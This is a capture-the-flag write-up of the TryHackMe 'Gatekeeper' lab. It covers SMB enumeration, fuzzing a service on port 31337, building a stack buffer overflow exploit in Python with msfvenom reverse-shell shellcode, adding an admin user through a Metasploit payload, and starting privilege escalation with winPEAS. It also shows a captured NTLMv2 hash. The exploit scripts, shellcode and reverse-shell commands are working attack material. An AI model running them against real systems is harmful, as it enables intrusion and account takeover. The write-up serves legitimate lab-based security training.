# Gatekeeper from TryHackMe!

Write-up by Herman Detwiler

# Brief

*Can you get past the gate and through the fire?*

Deploy the machine when you are ready to release the Gatekeeper.

**Writeups will not be accepted for this challenge**

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

# Recon and Service enumeration


Was able to get system info, found RDP RPC and SMB running. There is also an unknown service running on port 31337

## Nmap scan

```bash
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgro
up: WORKGROUP)                                           
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
31337/tcp open  Elite?             syn-ack ttl 125
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49161/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49162/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
```


## RPC

Rpc gives me some useful infomation that I will put in my back pocket for now. For example was able to rpcdump

```
└─$ cat tcp_135_rpc_rpcdump.txt|grep Provider                                                                  1 ⨯
Provider: wininit.exe
Provider: winlogon.exe
Provider: sysntfy.dll
Provider: winlogon.exe
Provider: wscsvc.dll
Provider: dhcpcsvc6.dll
Provider: dhcpcsvc.dll
Provider: nrpsrv.dll
Provider: wevtsvc.dll
Provider: certprop.dll
Provider: srvsvc.dll
Provider: iphlpsvc.dll
Provider: IKEEXT.DLL
Provider: schedsvc.dll
Provider: taskcomp.dll
Provider: taskcomp.dll
Provider: schedsvc.dll
Provider: gpsvc.dll
Provider: N/A
Provider: nsisvc.dll
Provider: samsrv.dll
Provider: spoolsv.exe
Provider: spoolsv.exe
Provider: spoolsv.exe
Provider: MPSSVC.dll
Provider: MPSSVC.dll
Provider: BFE.DLL
Provider: sysmain.dll
Provider: pcasvc.dll
Provider: services.exe
Provider: spoolsv.exe
Provider: FwRemoteSvr.dll
Provider: ssdpsrv.dll
```

# SMB

Was able to get a wealth of information via SMB, including the system info, a the binary that is potentially running on port 31337,
and verify that I can upload files to the share (which is also the home NTUSER directory on the system)


OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)

```
Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00 
```


Seems that I can access some files on over smb

using smbclient and cme



cme
```
└─$ sudo crackmapexec smb 10.10.22.17 -u 'Anonymous' -p ' ' --shares
SMB         10.10.22.17     445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.22.17     445    GATEKEEPER       [+] gatekeeper\Anonymous:  
SMB         10.10.22.17     445    GATEKEEPER       [+] Enumerated shares
SMB         10.10.22.17     445    GATEKEEPER       Share           Permissions     Remark
SMB         10.10.22.17     445    GATEKEEPER       -----           -----------     ------
SMB         10.10.22.17     445    GATEKEEPER       ADMIN$                          Remote Admin
SMB         10.10.22.17     445    GATEKEEPER       C$                              Default share
SMB         10.10.22.17     445    GATEKEEPER       IPC$                            Remote IPC
SMB         10.10.22.17     445    GATEKEEPER       Users           READ            

```

smbclient


I grab the local files and a gatekeeper.exe binary, also find I can put files:

```
                7863807 blocks of size 4096. 3868248 blocks available
smb: \share\> put test.txt
putting file test.txt as \share\test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \share\> dir
  .                                   D        0  Sun Aug 21 11:17:14 2022
  ..                                  D        0  Sun Aug 21 11:17:14 2022
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
  test.txt                            A       13  Sun Aug 21 11:17:14 2022

                7863807 blocks of size 4096. 3868248 blocks available
smb: \share\> 
```


# gatekeeper.exe


After grabbing gatekeeper.exe, my first step is running file and strings. From the strings command, it would seem this app is possibly hardcoded to run on port 31337.

*Also on a side-note it seems to be a rebuild of dostackbufferoverflowgood from the BOF_prep room*


```bash
└─$ strings gatekeeper.exe   

...
5ntel                                                                          
5Genu                                  
t#=`                                   
RSDSeF                                                                         
\\VBOXSVR\dostackbufferoverflowgood\dostackbufferoverflowgood\Release\dostackbufferoverflowgood.pdb
...
SetUnhandledExceptionFilter
GetStartupInfoW
IsProcessorFeaturePresent
GetModuleHandleW
GetCurrentProcess
TerminateProcess
KERNEL32.dll
WSAStartup failed: %d
31337
getaddrinfo failed: %d
socket() failed with error: %ld
bind() failed with error: %d
listen() failed with error: %ld
[+] Listening for connections.
accept failed: %d
Received connection from remote host.
Connection handed off to handler thread.
Please send shorter lines.
Bye!
[!] recvbuf exhausted. Giving up.
Client disconnected.
recv() failed: %d.
Bytes received: %d
exit
Client requested exit.
Hello %s!!!
send failed: %d
Bytes sent: %d
...

```

From here, I decide it would behoove me to create a virtual env with this OS and then build out an exploit locally.

However, only because I am aways on my laptop, I first want to try and see if I can just spin up OSCP_prep room.

If the OS is close, since it already has immunity and mona, I might just transfer gatekeeper there.

# Creating an exploit

Url for bof prep machine:https://tryhackme.com/room/bufferoverflowprep

(alt make your own VM)

After sending it over, I see that it prints a msg and counts the bytes I send. I will use this to create an exploit for the target.


## Finding the number of bytes it takes to crash the program.

This step is called fuzzing, I will send an increasing number bytes to this application with python, and then record when it crashes:

I find that when I send 1000 A's the system crashes. So I use metasploit to create a 1000 byte long non-repeating pattern.

```
/usr/bin/msf-pattern_create -l 1000|xclip -selection clipboard
```


I send this over with netcat an view the resaults in immunity:

I find the EIP offset at 146

![image](https://user-images.githubusercontent.com/83407557/185804854-39c58530-d554-4a69-aa8f-b82e476ccfd6.png)



This is the script I use the replicate the crash and see that I can put A's up to the offset of EIP, which I fill with B's then have ESP and beyond filled with C's

```python
#!/usr/bin/env python2
# exploit.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.218.237"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload

padding = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
payload = "C" * (1000-146-4)

buffer = overflow + retn + padding + payload

# build message followed by a newline
buf = ""
buf += buffer
buf += "\n"
s.send(buf)
print "Sent: {0}".format(buf)
data = s.recv(1024)
print "Received: {0}".format(data)


```

## Finding bad Characters

Before I am able to locate a good jump point or generate shellcode, I need to know the badchars that the application with miff up.

To do this I will need to create two matching byte arrays and then compare them after I send one as a payload, and see which chars get corrupted.


First I will create a byte array with the following python script to add to my payload:

```python
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
   print("\\x" + "{:02x}".format(x), end='')

print()

```

Then in mona I will create a working dir and then make a byte array (both the python array and mona are using \x00 as a badchar alreay)

`!mona config -set workingfolder c:\mona\%p`

`!mona bytearray -b "\x00"`

I will take note of the working dir location:

![image](https://user-images.githubusercontent.com/83407557/185806871-7c8cb197-596f-4a1d-bfbb-110ba060ba93.png)


```python
#!/usr/bin/env python2
# exploit.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.218.237"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload

padding = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
#payload = "C" * (1000-146-4)
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = overflow + retn + padding + payload

# build a happy little message followed by a newline
buf = ""
buf += buffer
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

After sending the above script I note the value of the ESP reg for the compare command:

![image](https://user-images.githubusercontent.com/83407557/185806906-22593b0e-884e-4754-ba80-8a53bbc74493.png)

I use this address of 015E19F8 to comapre the two byte arrays

`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 015E19F8`

![image](https://user-images.githubusercontent.com/83407557/185807012-91666bea-9c8f-4d2a-bea2-42f9b86fa54a.png)


I remove \x0a from both arrays and resend:

![image](https://user-images.githubusercontent.com/83407557/185807142-04430f2d-21bd-45bd-a938-58126bb1ac65.png)

After both \x00\x0a were removed It seems the rest of the array can go through with no problem:

![image](https://user-images.githubusercontent.com/83407557/185807204-cbcd40e6-e85c-483e-badb-d0ed49edecbe.png)


# finding jmp esp address

I can now see if there are any jmp esp instructios that will not contain the badchars

`!mona jmp -r esp -cpb "\x00\x0a"`

I find two pointers 

![image](https://user-images.githubusercontent.com/83407557/185808329-e5ef54cd-f969-4b98-a75c-a52d20f380b5.png)


I can either try address

\xc3\x14\x04\x08

or

\xbf\x16\x04\x08


I will try the first one and generate shellcode with msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 EXITFUNC=thread -b "\x00\x0a" -f c > shellcode_53

```

Making the payload with jump esp retn address and a NOP sleed for padding

```python
#!/usr/bin/env python2
# exploit.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.100.55"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload

padding = "\x90" * 16
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
payload = ("\xbb\x17\xbe\x16\xd5\xdb\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x58\x12\x83\xe8\xfc\x03\x4f\xb0\xf4\x20\x93\x24\x7a"
"\xca\x6b\xb5\x1b\x42\x8e\x84\x1b\x30\xdb\xb7\xab\x32\x89\x3b"
"\x47\x16\x39\xcf\x25\xbf\x4e\x78\x83\x99\x61\x79\xb8\xda\xe0"
"\xf9\xc3\x0e\xc2\xc0\x0b\x43\x03\x04\x71\xae\x51\xdd\xfd\x1d"
"\x45\x6a\x4b\x9e\xee\x20\x5d\xa6\x13\xf0\x5c\x87\x82\x8a\x06"
"\x07\x25\x5e\x33\x0e\x3d\x83\x7e\xd8\xb6\x77\xf4\xdb\x1e\x46"
"\xf5\x70\x5f\x66\x04\x88\x98\x41\xf7\xff\xd0\xb1\x8a\x07\x27"
"\xcb\x50\x8d\xb3\x6b\x12\x35\x1f\x8d\xf7\xa0\xd4\x81\xbc\xa7"
"\xb2\x85\x43\x6b\xc9\xb2\xc8\x8a\x1d\x33\x8a\xa8\xb9\x1f\x48"
"\xd0\x98\xc5\x3f\xed\xfa\xa5\xe0\x4b\x71\x4b\xf4\xe1\xd8\x04"
"\x39\xc8\xe2\xd4\x55\x5b\x91\xe6\xfa\xf7\x3d\x4b\x72\xde\xba"
"\xac\xa9\xa6\x54\x53\x52\xd7\x7d\x90\x06\x87\x15\x31\x27\x4c"
"\xe5\xbe\xf2\xc3\xb5\x10\xad\xa3\x65\xd1\x1d\x4c\x6f\xde\x42"
"\x6c\x90\x34\xeb\x07\x6b\xdf\x1e\xde\x3e\x39\x77\xdc\xc0\x45"
"\xb2\x69\x26\x2f\xac\x3f\xf1\xd8\x55\x1a\x89\x79\x99\xb0\xf4"
"\xba\x11\x37\x09\x74\xd2\x32\x19\xe1\x12\x09\x43\xa4\x2d\xa7"
"\xeb\x2a\xbf\x2c\xeb\x25\xdc\xfa\xbc\x62\x12\xf3\x28\x9f\x0d"
"\xad\x4e\x62\xcb\x96\xca\xb9\x28\x18\xd3\x4c\x14\x3e\xc3\x88"
"\x95\x7a\xb7\x44\xc0\xd4\x61\x23\xba\x96\xdb\xfd\x11\x71\x8b"
"\x78\x5a\x42\xcd\x84\xb7\x34\x31\x34\x6e\x01\x4e\xf9\xe6\x85"
"\x37\xe7\x96\x6a\xe2\xa3\xb7\x88\x26\xde\x5f\x15\xa3\x63\x02"
"\xa6\x1e\xa7\x3b\x25\xaa\x58\xb8\x35\xdf\x5d\x84\xf1\x0c\x2c"
"\x95\x97\x32\x83\x96\xbd")

buffer = overflow + retn + padding + payload

# build a happy little message followed by a newline
buf = ""
buf += buffer
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)

```

I start a listener on port 53 and run the exploit to get a callback

```
└─$ sudo nc -lvnp 53
listening on [any] 53 ...
connect to [10.6.77.38] from (UNKNOWN) [10.10.100.55] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop>

```


Since the prompt was talking about firewalls, lets see if I can add a user instead of dealing with firewalls.

```bash
msf6 payload(windows/adduser) > show options

Module options (payload/windows/adduser):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CUSTOM                     no        Custom group name to be used instead of default
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   PASS      Metasploit$1     yes       The password for this user
   USER      metasploit       yes       The username to create
   WMIC      false            yes       Use WMIC on the target to resolve administrators group

```

With this as the payload, before sending it (using cme to check if user exists)

![image](https://user-images.githubusercontent.com/83407557/185809287-c95235a4-155b-4ba3-bdf0-703937559968.png)

However after running exploit

![image](https://user-images.githubusercontent.com/83407557/185809308-a63582f2-8325-4bfb-8333-222cbfc68f6e.png)

I see that now that user exists and is an admin

![image](https://user-images.githubusercontent.com/83407557/185809320-df3c5e40-96bb-4242-876d-8cca1bb818fc.png)

I now have 2 potential exploits (one that bypasses firewalls) that I can use against the machine Gatekeeper.

# Storming the gate.

I will now restart Gatekeeper and get the new ip, and update the two scripts.

First let me try the revshell

starting a listener on port 53, I get a callback:


```
└─$ sudo nc -lvnp 53
[sudo] password: 
listening on [any] 53 ...
connect to [10.6.77.38] from (UNKNOWN) [10.10.236.87] 49172
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat

C:\Users\natbat\Desktop>
```

Looking at the current directory I see user.txt

```
C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  09:24 PM    <DIR>          .
05/14/2020  09:24 PM    <DIR>          ..
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,879,462,912 bytes free
```

```
C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!

```



also the bat file that I want to view. 

```
C:\Users\natbat\Desktop>type gatekeeperstart.bat
type gatekeeperstart.bat
@echo off
:start 
start /w C:\Users\natbat\Desktop\gatekeeper.exe
::Wait 90 seconds before restarting.
TIMEOUT /T 5
GOTO:Start
```

Seems like it will restart gatekeeper even if it crashes

Also can still connect via netcat:

```
└─$ nc 10.10.236.87 31337
Hello !!!

```

So I will try and send the addusr script and check if my user is added (note this will only work if the gatekeeper is running as admin)

```
└─$ sudo crackmapexec smb 10.10.236.87 -u 'metasploit' -p 'Metasploit$1'
[sudo] password for nith: 
SMB         10.10.236.87    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.236.87    445    GATEKEEPER       [+] gatekeeper\metasploit:Metasploit$1 
                                                                                                                                                                                                                                             
┌──(nith㉿kastle)-[~/CTF/THM/GateKeeper]
└─$ ./adduser.py 
%tU(뢚ThGcp"f6a@!pe&EMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYt$[+ɱG1CCe *BB6s12$;1ɰZr.ڊn,mNBl<@j&ZƇɪ m4p}    >c< >#u5Z[;k?G#w4,mwn|Hi᧓lwnFV  QGm
                      5*lRQc7_fi"UboK"35٢R@~)z4HR!)

Traceback (most recent call last):
  File "./adduser.py", line 59, in <module>
    data = s.recv(1024)
socket.error: [Errno 104] Connection reset by peer
                                                                                                                                                                                                                                             
┌──(nith㉿kastle)-[~/CTF/THM/GateKeeper]
└─$ sudo crackmapexec smb 10.10.236.87 -u 'metasploit' -p 'Metasploit$1'                                                                                 SMB         10.10.236.87    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.236.87    445    GATEKEEPER       [+] gatekeeper\metasploit:Metasploit$1 
                                                    
```

This does not work, so I am going to need to find a different path to priv esc.

# priv esc

First let me send over winpeas


wget on linux to send over wtih 

`wget https://github.com/carlospolop/PEASS-ng/releases/download/20220821/winPEASx86.exe`


I then use impackest smb server on kali and the copy command to get it on windows

kali
```
└─$ /usr/share/doc/python3-impacket/examples/smbserver.py kali .                                                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                            
                                                                                                                    
[*] Config file parsed                                                                                              
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                              
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                              
[*] Config file parsed                                                                                              
[*] Config file parsed                                                                                              
[*] Config file parsed                                                                                              
[*] Incoming connection (10.10.58.134,49203)                                                                        
[*] AUTHENTICATE_MESSAGE (GATEKEEPER\natbat,GATEKEEPER)                                                             
[*] User GATEKEEPER\natbat authenticated successfully                                                               
[*] natbat::GATEKEEPER:aaaaaaaaaaaaaaaa:33e7bd5634e51080996a6856de32e8ee:01010000000000000004dabca7b5d801d9d0181cfac
3dd2000000000010010004600440065004300530045006f004b00030010004600440065004300530045006f004b00020010006c0071005500510
04e004b0065004900040010006c007100550051004e004b0065004900070008000004dabca7b5d80106000400020000000800300030000000000
0000000000000002000007e9045fca604931b264ccb5d2d348c5dc70b1152fc6a6b04879c1282e07b9c350a00100000000000000000000000000
00000000009001e0063006900660073002f00310030002e0036002e00370037002e0033003800000000000000000000000000               
[-] Unknown level for query path info! 0x109                                                                        
[*] Disconnecting Share(1:IPC$)    
```

Then to copy with windows


```
C:\Users\Share>copy \\10.6.77.38\kali\peas.exe c:\users\Share\peas.exe
copy \\10.6.77.38\kali\peas.exe c:\users\Share\peas.exe
        1 file(s) copied.

C:\Users\Share>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\Share

08/21/2022  05:48 PM    <DIR>          .
08/21/2022  05:48 PM    <DIR>          ..
04/20/2020  01:27 AM            13,312 gatekeeper.exe
08/21/2022  12:35 AM         1,965,056 peas.exe
               2 File(s)      1,978,368 bytes
               2 Dir(s)  15,750,787,072 bytes free

C:\Users\Share>peas.exe > pea.log
peas.exe > pea.log
```


I do this so that even if my shell dies, I can get the pea.log via the smb share (also I have write access there...so)

